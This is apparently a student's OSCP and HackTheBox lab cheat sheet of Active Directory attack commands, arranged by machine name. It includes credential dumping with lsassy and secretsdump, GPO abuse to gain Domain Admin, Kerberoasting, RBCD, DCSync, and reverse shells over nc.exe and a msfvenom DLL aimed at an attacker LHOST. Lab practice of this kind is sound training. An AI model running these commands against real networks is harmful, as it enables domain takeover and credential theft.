
#### OSCP A => Ligolo + cred hunting 
1. Kerberoasting, mssql, smb were all red herrings. Always try spraying creds on **every** machine first! 

#### Secura => Lsassy, MySQL, WriteOwner + GPLink 
1. On M1 user is admin, run `nxc smb {{TARGET_IP}} -u {{USERNAME}} -p '{{PASSWORD}}' -M lsassy` 
2. On M2 `mysqldump.exe -u root --all-databases > dump.sql`, bloodhound shows GPO abuse 
3. On M2 `$Pass = ConvertTo-SecureString '{{PASSWORD}}' -AsPlainText -Force` then `$Cred = New-Object System.Management.Automation.PSCredential('secura.yzx\charlotte', $Pass)` then `Import-Module .\PowerView.ps1` 
4. On M2 `Get-DomainGPO -Domain secura.yzx -Server 192.168.92.97 -Credential $Cred -Identity 'Default Domain Policy' | Select-Object name, displayname` 
5. On M2 `Set-DomainObjectOwner -Identity "31B2F340-016D-11D2-945F-00C04FB984F9" -OwnerIdentity charlotte -Server 192.168.92.97 -Credential $Cred` 
6. On M2 `Add-DomainObjectAcl -TargetIdentity "31B2F340-016D-11D2-945F-00C04FB984F9" -PrincipalIdentity charlotte -Rights All -Server 192.168.92.97 -Credential $Cred` 
7. On kali `python3 pygpoabuse.py -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -dc-ip {{DC_IP}} -command "net group \"Domain Admins\" charlotte /add /domain" 'secura.yzx/charlotte:{{PASSWORD}}'` 
8. On M3 `gpupdate /force` then kali `impacket-secretsdump 'secura.yzx/charlotte:{{PASSWORD}}@{{DC_IP}}'` 

==== 

#### Access => Kerberoasting, SeManageVolumePrivilege 
1. Import PowerView, `Get-netuser svc_mssql`, user has SPN = `./Rubeus.exe kerberoast /nowrap` (alternatively store token in memory) 
2. Import RunasCs, then `Invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/nc.exe {{LHOST}} 4444 -e cmd.exe'` 

#### Heist => Group user can dump password 
1. Run responder with HTTP & 'http://{{LHOST}}', in todo.txt 'enox' is handing web admin to 'svc_apache$' so might have power over this svc acc = import ActiveDirectory then `Get-ADPrincipalGroupMembership svc_apache$` 
2. Run `Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword | Select-Object Name, PrincipalsAllowedToRetrieveManagedPassword` to check, then `Import-Module .\GMSAPassword.ps1` to dump (or alternatively `GMSAPasswordReader.exe --accountname svc_apache`) 

#### Hutch => DAV 
1. Do ldapsearch + descriptions to get creds, then use `cadaver` to upload aspx, rev shell, potato into dav.  
2. Alternatively, bloodhound shows ReadLAPSPassword so `nxc ldap {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} -M laps` 

#### Nagoya => Fucking piece of shit ticket 
1. Make users list from website, guess some passwords (eg Summer2023, Nagoya2023) and spray 
2. In rpcclient, 'fiona' changes pw for 'svc_helpdesk', 'svc_helpdesk' changes pw for 'christopher'. 
3. Run `Import-Module ActiveDirectory` then `Get-ADDomain` then `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` to get sid 
4. Kerberoast to get svc_mssql (can also be done with dumped creds & impacket), run chisel = https://medium.com/@mu.aktepe18/nagoya-proving-ground-walk-through-afb50d51bb0f 

#### Resourced => RBCD 
1. Check enum4linux properly! `crackmapexec winrm {{DC_IP}} -u names.txt -H hashes.txt` 
2. User has SeMachineAccountPrivilege = can create machine accounts even if ms-DS-MachineAccountQuota = 0 
3. User has GenericAll on DC machine = `impacket-addcomputer -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host {{DC_IP}} -domain-netbios {{DOMAIN}} '{{DOMAIN}}/{{USERNAME}}' -hashes ':{{HASH}}'` 
4. `impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to '{{MACHINE_NAME}}$' -action 'write' '{{DOMAIN}}/{{USERNAME}}' -hashes ':{{HASH}}' -dc-ip {{DC_IP}}` 
5. `impacket-getST -spn 'cifs/{{MACHINE_NAME}}.{{DOMAIN}}' -impersonate 'Administrator' '{{DOMAIN}}/attackersystem$:Summer2018!' -dc-ip {{DC_IP}}` 
6. `KRB5CCNAME=./{{KERBEROS_TICKET}}.ccache impacket-psexec {{MACHINE_NAME}}.{{DOMAIN}}  -target-ip {{DC_IP}} -k -no-pass"` 

#### Vault => Responder on icon.url 
1. Put icon.url in writable smb, then let responder get hash. 
2. Either replace utilman with cmd (SeRestorePrivilege) or abuse GenericWrite on Default Domain Policy using `./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"` then `gpupdate /force` 

==== 

#### Active => GPP in xml 
SMB: ` gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ ` 

#### Cascade => pw in ldapsearch 
1. 1st password Base64 encoded! 2nd password TightVNC encrypted. 
2. 3rd password custom encoded = https://dev.to/micheaol/htb-cascade-walkthrough-1pik 
3. ` Get-ADObject -Filter 'isDeleted -eq $true -and name -like "*Admin*"' -IncludeDeletedObjects -Properties * ` 

#### Forest => LDAP 
1. Run ldapsearch, rpcclient, enum4linux to get users 
2. Run net users, whoami, bloodhound to see *GenericAll* on group = `net group "Exchange Windows Permissions" {{USERNAME}} /add /domain`  
3. Group has *WriteDACL* on domain = do `bloodyAD --host {{DC_IP}} -d htb.local -u {{USERNAME}} -p {{PASSWORD}} add dcsync {{USERNAME}}` to get DCSync. 

#### Sauna => usernames from website 
1. WinPEAS found autologon creds 
2. ` reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon" ` 
3. User has GetChanges & GetChangesAll = can do DCsync 

#### Support => decompile UserInfo.exe 
1. Can use https://github.com/dnSpy/dnSpy or `ilspycmd -p -o reverse_userinfo UserInfo.exe` 
2. Find pw in ldapsearch **'info'** field 
3. Group has GenericAll on domain = reset password for DC$ machine 

#### Timelapse => john the zip 
1. ` zip2john backup.zip > zip.hash ` then ` john ziphash.txt > pw.txt ` 
2. ` pfx2john auth.pfx > pfxhash.hash ` then ` john pfxhash.txt > pfxcracked.txt ` 

#### Resolute => pw in discription 
1. Run rpcclient `querydispinfo` to get password 
2. Run `dir -force` to see hidden files 
3. User is in DnsAdmins group = use dnscmd.exe to inject msfvenom DLL 
4. `msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT=443 -f dll -o rev.dll` 

#### Scepter => 
Walkthrough = https://0xdf.gitlab.io/2025/07/19/htb-scepter.html 
1. Crack pfx & pem with john, use pem creds to gen pfx to get 1st user hash & tgt 
2. Check **outbound** control, change 2nd user pw 
3. Change 1st user altSecurityIdentities to same as 3rd user, request StaffAccessCertificate as 3rd user (2nd user has GenericAll over StaffAccessCertificate, so use bloodyAD to give full control) 
4. Use 3rd user to set altSecurityIdentities for 4th user and repeat [3]; 4th user can DCsync. 
